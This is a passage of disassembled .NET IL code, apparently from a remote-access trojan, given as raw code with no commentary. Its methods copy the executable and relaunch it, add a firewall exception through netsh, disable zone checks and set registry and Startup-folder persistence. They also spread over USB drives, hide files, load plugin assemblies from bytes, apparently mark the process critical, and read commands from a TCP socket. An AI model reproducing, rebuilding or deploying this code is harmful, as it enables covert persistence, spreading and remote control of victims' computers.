    IL_0324:  ldfld      string k.OK::Y
    IL_0329:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_032e:  stloc.1
    IL_032f:  br.s       IL_0343

    IL_0331:  ldloc.1
    IL_0332:  ldstr      "No"
    IL_0337:  ldarg.0
    IL_0338:  ldfld      string k.OK::Y
    IL_033d:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0342:  stloc.1
    IL_0343:  ldc.i4.7
    IL_0344:  newarr     [mscorlib]System.String
    IL_0349:  stloc.s    V_16
    IL_034b:  ldloc.s    V_16
    IL_034d:  ldc.i4.0
    IL_034e:  ldloc.1
    IL_034f:  stelem.ref
    IL_0350:  ldloc.s    V_16
    IL_0352:  ldc.i4.1
    IL_0353:  ldarg.0
    IL_0354:  ldfld      string k.OK::VR
    IL_0359:  stelem.ref
    IL_035a:  ldloc.s    V_16
    IL_035c:  ldc.i4.2
    IL_035d:  ldarg.0
    IL_035e:  ldfld      string k.OK::Y
    IL_0363:  stelem.ref
    IL_0364:  ldloc.s    V_16
    IL_0366:  ldc.i4.3
    IL_0367:  ldstr      ".."
    IL_036c:  stelem.ref
    IL_036d:  ldloc.s    V_16
    IL_036f:  ldc.i4.4
    IL_0370:  ldarg.0
    IL_0371:  ldfld      string k.OK::Y
    IL_0376:  stelem.ref
    IL_0377:  ldloc.s    V_16
    IL_0379:  ldc.i4.5
    IL_037a:  ldarg.0
    IL_037b:  callvirt   instance string k.OK::ACT()
    IL_0380:  stelem.ref
    IL_0381:  ldloc.s    V_16
    IL_0383:  ldc.i4.6
    IL_0384:  ldarg.0
    IL_0385:  ldfld      string k.OK::Y
    IL_038a:  stelem.ref
    IL_038b:  ldloc.s    V_16
    IL_038d:  call       string [mscorlib]System.String::Concat(string[])
    IL_0392:  stloc.1
    IL_0393:  ldstr      ""
    IL_0398:  stloc.2
    .try
    {
      IL_0399:  ldarg.0
      IL_039a:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_039f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_03a4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_03a9:  ldstr      "software\\"
      IL_03ae:  ldarg.0
      IL_03af:  ldfld      string k.OK::RG
      IL_03b4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_03b9:  ldc.i4.0
      IL_03ba:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_03bf:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_03c4:  stloc.s    V_18
      IL_03c6:  ldc.i4.0
      IL_03c7:  stloc.s    V_17
      IL_03c9:  br.s       IL_03f1

      IL_03cb:  ldloc.s    V_18
      IL_03cd:  ldloc.s    V_17
      IL_03cf:  ldelem.ref
      IL_03d0:  stloc.s    V_11
      IL_03d2:  ldloc.s    V_11
      IL_03d4:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_03d9:  ldc.i4.s   32
      IL_03db:  bne.un.s   IL_03eb

      IL_03dd:  ldloc.2
      IL_03de:  ldloc.s    V_11
      IL_03e0:  ldstr      ","
      IL_03e5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ea:  stloc.2
      IL_03eb:  ldloc.s    V_17
      IL_03ed:  ldc.i4.1
      IL_03ee:  add.ovf
      IL_03ef:  stloc.s    V_17
      IL_03f1:  ldloc.s    V_17
      IL_03f3:  ldloc.s    V_18
      IL_03f5:  ldlen
      IL_03f6:  conv.ovf.i4
      IL_03f7:  blt.s      IL_03cb

      IL_03f9:  leave.s    IL_0407

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0400:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0405:  leave.s    IL_0407

    }  // end handler
    IL_0407:  ldloc.1
    IL_0408:  ldloc.2
    IL_0409:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_040e:  ret
  } // end of method OK::inf

  .method public instance void  INS() cil managed noinlining nooptimization
  {
    // Code size       825 (0x339)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.Exception V_2,
             string[] V_3)
    IL_0000:  ldc.i4     0x3e8
    IL_0005:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000a:  ldarg.0
    IL_000b:  ldfld      bool k.OK::Idr
    IL_0010:  brfalse    IL_014b

    IL_0015:  ldarg.0
    IL_0016:  ldarg.0
    IL_0017:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
    IL_001c:  ldarg.0
    IL_001d:  ldfld      string k.OK::DR
    IL_0022:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0027:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_002c:  ldstr      "\\"
    IL_0031:  ldarg.0
    IL_0032:  ldfld      string k.OK::EXE
    IL_0037:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0041:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0046:  callvirt   instance bool k.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                                     class [mscorlib]System.IO.FileInfo)
    IL_004b:  brtrue     IL_014b

    .try
    {
      IL_0050:  ldarg.0
      IL_0051:  ldfld      string k.OK::DR
      IL_0056:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_005b:  ldstr      "\\"
      IL_0060:  ldarg.0
      IL_0061:  ldfld      string k.OK::EXE
      IL_0066:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006b:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0070:  brfalse.s  IL_0092

      IL_0072:  ldarg.0
      IL_0073:  ldfld      string k.OK::DR
      IL_0078:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_007d:  ldstr      "\\"
      IL_0082:  ldarg.0
      IL_0083:  ldfld      string k.OK::EXE
      IL_0088:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_008d:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0092:  ldarg.0
      IL_0093:  ldfld      string k.OK::DR
      IL_0098:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_009d:  ldstr      "\\"
      IL_00a2:  ldarg.0
      IL_00a3:  ldfld      string k.OK::EXE
      IL_00a8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ad:  ldc.i4.1
      IL_00ae:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00b3:  stloc.1
      IL_00b4:  ldarg.0
      IL_00b5:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_00ba:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00bf:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00c4:  stloc.0
      IL_00c5:  ldloc.1
      IL_00c6:  ldloc.0
      IL_00c7:  ldc.i4.0
      IL_00c8:  ldloc.0
      IL_00c9:  ldlen
      IL_00ca:  conv.ovf.i4
      IL_00cb:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00d0:  ldloc.1
      IL_00d1:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00d6:  ldloc.1
      IL_00d7:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00dc:  ldarg.0
      IL_00dd:  ldarg.0
      IL_00de:  ldfld      string k.OK::DR
      IL_00e3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00e8:  ldstr      "\\"
      IL_00ed:  ldarg.0
      IL_00ee:  ldfld      string k.OK::EXE
      IL_00f3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f8:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_00fd:  stfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0102:  ldarg.0
      IL_0103:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0108:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_010d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0112:  pop
      IL_0113:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0118:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_011d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0122:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0127:  leave.s    IL_014b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0129:  dup
      IL_012a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012f:  stloc.2
      IL_0130:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0135:  callvirt   instance int32 [System]System.Diagnostics.Process::get_Id()
      IL_013a:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_013f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0144:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0149:  leave.s    IL_014b

    }  // end handler
    .try
    {
      IL_014b:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_0150:  ldstr      "1"
      IL_0155:  ldc.i4.1
      IL_0156:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_015b:  leave.s    IL_0169

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0162:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0167:  leave.s    IL_0169

    }  // end handler
    .try
    {
      IL_0169:  ldc.i4.5
      IL_016a:  newarr     [mscorlib]System.String
      IL_016f:  stloc.3
      IL_0170:  ldloc.3
      IL_0171:  ldc.i4.0
      IL_0172:  ldstr      "netsh firewall add allowedprogram \""
      IL_0177:  stelem.ref
      IL_0178:  ldloc.3
      IL_0179:  ldc.i4.1
      IL_017a:  ldarg.0
      IL_017b:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0180:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0185:  stelem.ref
      IL_0186:  ldloc.3
      IL_0187:  ldc.i4.2
      IL_0188:  ldstr      "\" \""
      IL_018d:  stelem.ref
      IL_018e:  ldloc.3
      IL_018f:  ldc.i4.3
      IL_0190:  ldarg.0
      IL_0191:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0196:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_019b:  stelem.ref
      IL_019c:  ldloc.3
      IL_019d:  ldc.i4.4
      IL_019e:  ldstr      "\" ENABLE"
      IL_01a3:  stelem.ref
      IL_01a4:  ldloc.3
      IL_01a5:  call       string [mscorlib]System.String::Concat(string[])
      IL_01aa:  ldc.i4.0
      IL_01ab:  ldc.i4.0
      IL_01ac:  ldc.i4.m1
      IL_01ad:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01b2:  pop
      IL_01b3:  leave.s    IL_01c1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bf:  leave.s    IL_01c1

    }  // end handler
    IL_01c1:  ldarg.0
    IL_01c2:  ldfld      bool k.OK::Isu
    IL_01c7:  brfalse    IL_026a

    .try
    {
      IL_01cc:  ldarg.0
      IL_01cd:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_01d2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_01d7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_01dc:  ldarg.0
      IL_01dd:  ldfld      string k.OK::sf
      IL_01e2:  ldc.i4.1
      IL_01e3:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01e8:  ldarg.0
      IL_01e9:  ldfld      string k.OK::RG
      IL_01ee:  ldstr      "\""
      IL_01f3:  ldarg.0
      IL_01f4:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_01f9:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01fe:  ldstr      "\" .."
      IL_0203:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0208:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_020d:  leave.s    IL_021b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_020f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0214:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0219:  leave.s    IL_021b

    }  // end handler
    .try
    {
      IL_021b:  ldarg.0
      IL_021c:  ldfld      class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer k.OK::F
      IL_0221:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0226:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_022b:  ldarg.0
      IL_022c:  ldfld      string k.OK::sf
      IL_0231:  ldc.i4.1
      IL_0232:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0237:  ldarg.0
      IL_0238:  ldfld      string k.OK::RG
      IL_023d:  ldstr      "\""
      IL_0242:  ldarg.0
      IL_0243:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0248:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_024d:  ldstr      "\" .."
      IL_0252:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0257:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_025c:  leave.s    IL_026a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_025e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0263:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0268:  leave.s    IL_026a

    }  // end handler
    IL_026a:  ldarg.0
    IL_026b:  ldfld      bool k.OK::IsF
    IL_0270:  brfalse.s  IL_02d3

    .try
    {
      IL_0272:  ldarg.0
      IL_0273:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_0278:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_027d:  ldc.i4.7
      IL_027e:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0283:  ldstr      "\\"
      IL_0288:  ldarg.0
      IL_0289:  ldfld      string k.OK::RG
      IL_028e:  ldstr      ".exe"
      IL_0293:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0298:  ldc.i4.1
      IL_0299:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_029e:  ldarg.0
      IL_029f:  ldc.i4.7
      IL_02a0:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02a5:  ldstr      "\\"
      IL_02aa:  ldarg.0
      IL_02ab:  ldfld      string k.OK::RG
      IL_02b0:  ldstr      ".exe"
      IL_02b5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02ba:  ldc.i4.3
      IL_02bb:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_02c0:  stfld      class [mscorlib]System.IO.FileStream k.OK::FS
      IL_02c5:  leave.s    IL_02d3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02d1:  leave.s    IL_02d3

    }  // end handler
    IL_02d3:  ldarg.0
    IL_02d4:  ldfld      bool k.OK::Spr
    IL_02d9:  brfalse.s  IL_02e2

    IL_02db:  ldarg.0
    IL_02dc:  ldc.i4.1
    IL_02dd:  callvirt   instance void k.OK::USBspr(bool)
    IL_02e2:  ldarg.0
    IL_02e3:  ldfld      bool k.OK::Hid
    IL_02e8:  brfalse.s  IL_0338

    .try
    {
      IL_02ea:  ldarg.0
      IL_02eb:  ldfld      class [mscorlib]System.IO.FileInfo k.OK::LO
      IL_02f0:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_02f5:  ldc.i4.2
      IL_02f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_02fb:  leave.s    IL_0309

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0302:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0307:  leave.s    IL_0309

    }  // end handler
    .try
    {
      IL_0309:  ldc.i4.7
      IL_030a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_030f:  ldstr      "\\"
      IL_0314:  ldarg.0
      IL_0315:  ldfld      string k.OK::RG
      IL_031a:  ldstr      ".exe"
      IL_031f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0324:  ldc.i4.2
      IL_0325:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.FileSystem::SetAttr(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.FileAttribute)
      IL_032a:  leave.s    IL_0338

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_032c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0331:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0336:  leave.s    IL_0338

    }  // end handler
    IL_0338:  ret
  } // end of method OK::INS

  .method public instance string  md5(uint8[] B) cil managed
  {
    // Code size       63 (0x3f)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             uint8 V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.1
    IL_0006:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.1
    IL_0013:  ldarg.1
    IL_0014:  stloc.s    V_4
    IL_0016:  ldc.i4.0
    IL_0017:  stloc.3
    IL_0018:  br.s       IL_0036

    IL_001a:  ldloc.s    V_4
    IL_001c:  ldloc.3
    IL_001d:  ldelem.u1
    IL_001e:  stloc.2
    IL_001f:  ldloc.1
    IL_0020:  ldloca.s   V_2
    IL_0022:  ldstr      "x2"
    IL_0027:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0031:  stloc.1
    IL_0032:  ldloc.3
    IL_0033:  ldc.i4.1
    IL_0034:  add.ovf
    IL_0035:  stloc.3
    IL_0036:  ldloc.3
    IL_0037:  ldloc.s    V_4
    IL_0039:  ldlen
    IL_003a:  conv.ovf.i4
    IL_003b:  blt.s      IL_001a

    IL_003d:  ldloc.1
    IL_003e:  ret
  } // end of method OK::md5

  .method public instance object  Plugin(uint8[] b,
                                         string c) cil managed
  {
    // Code size       110 (0x6e)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Type V_1,
             class [mscorlib]System.Reflection.Module V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6)
    IL_0000:  ldarg.1
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.s    V_4
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.3
    IL_000f:  br.s       IL_0065

    IL_0011:  ldloc.s    V_4
    IL_0013:  ldloc.3
    IL_0014:  ldelem.ref
    IL_0015:  stloc.2
    IL_0016:  ldloc.2
    IL_0017:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001c:  stloc.s    V_6
    IL_001e:  ldc.i4.0
    IL_001f:  stloc.s    V_5
    IL_0021:  br.s       IL_0059

    IL_0023:  ldloc.s    V_6
    IL_0025:  ldloc.s    V_5
    IL_0027:  ldelem.ref
    IL_0028:  stloc.1
    IL_0029:  ldloc.1
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.2
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0053

    IL_0041:  ldloc.2
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.1
    IL_0048:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004d:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0052:  ret

    IL_0053:  ldloc.s    V_5
    IL_0055:  ldc.i4.1
    IL_0056:  add.ovf
    IL_0057:  stloc.s    V_5
    IL_0059:  ldloc.s    V_5
    IL_005b:  ldloc.s    V_6
    IL_005d:  ldlen
    IL_005e:  conv.ovf.i4
    IL_005f:  blt.s      IL_0023

    IL_0061:  ldloc.3
    IL_0062:  ldc.i4.1
    IL_0063:  add.ovf
    IL_0064:  stloc.3
    IL_0065:  ldloc.3
    IL_0066:  ldloc.s    V_4
    IL_0068:  ldlen
    IL_0069:  conv.ovf.i4
    IL_006a:  blt.s      IL_0011

    IL_006c:  ldnull
    IL_006d:  ret
  } // end of method OK::Plugin

  .method public instance uint8[]  SB(string& s) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  2
    .locals init (uint8[] V_0)
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.1
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public instance void  pr(int32 i) cil managed
  {
    // Code size       36 (0x24)
    .maxstack  4
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 k.OK::NtsetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0023

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0021:  leave.s    IL_0023

    }  // end handler
    IL_0023:  ret
  } // end of method OK::pr

  .method public instance void  RC() cil managed
  {
    // Code size       570 (0x23a)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             int64 V_3,
             string V_4,
             int32 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             int32 V_7,
             char V_8)
    IL_0000:  ldarg.0
    IL_0001:  ldstr      ""
    IL_0006:  stfld      string k.OK::lastcap
    IL_000b:  ldarg.0
    IL_000c:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
    IL_0011:  brfalse    IL_01e3

    IL_0016:  ldc.i4.m1
    IL_0017:  conv.i8
    IL_0018:  stloc.0
    IL_0019:  ldc.i4.0
    IL_001a:  stloc.1
    .try
    {
      IL_001b:  ldloc.1
      IL_001c:  ldc.i4.1
      IL_001d:  add.ovf
      IL_001e:  stloc.1
      IL_001f:  ldloc.1
      IL_0020:  ldc.i4.s   10
      IL_0022:  bne.un.s   IL_002c

      IL_0024:  ldc.i4.0
      IL_0025:  stloc.1
      IL_0026:  ldc.i4.1
      IL_0027:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002c:  ldarg.0
      IL_002d:  ldfld      bool k.OK::Cn
      IL_0032:  brtrue.s   IL_0039

      IL_0034:  leave      IL_01e3

      IL_0039:  ldarg.0
      IL_003a:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_003f:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0044:  ldc.i4.1
      IL_0045:  bge.s      IL_005a

      IL_0047:  ldarg.0
      IL_0048:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_004d:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0052:  ldc.i4.m1
      IL_0053:  ldc.i4.0
      IL_0054:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0059:  pop
      IL_005a:  ldarg.0
      IL_005b:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_0060:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0065:  ldc.i4.0
      IL_0066:  ble        IL_01d5

      IL_006b:  ldloc.0
      IL_006c:  ldc.i4.m1
      IL_006d:  conv.i8
      IL_006e:  bne.un     IL_00f5

      IL_0073:  ldstr      ""
      IL_0078:  stloc.s    V_4
      IL_007a:  ldarg.0
      IL_007b:  ldfld      class [System]System.Net.Sockets.TcpClient k.OK::C
      IL_0080:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_0085:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_008a:  stloc.s    V_5
      IL_008c:  ldloc.s    V_5
      IL_008e:  ldc.i4.m1
      IL_008f:  sub
      IL_0090:  switch     ( 
                            IL_009f,
                            IL_00a4)
      IL_009d:  br.s       IL_00da

      IL_009f:  leave      IL_01e3

      IL_00a4:  ldloc.s    V_4
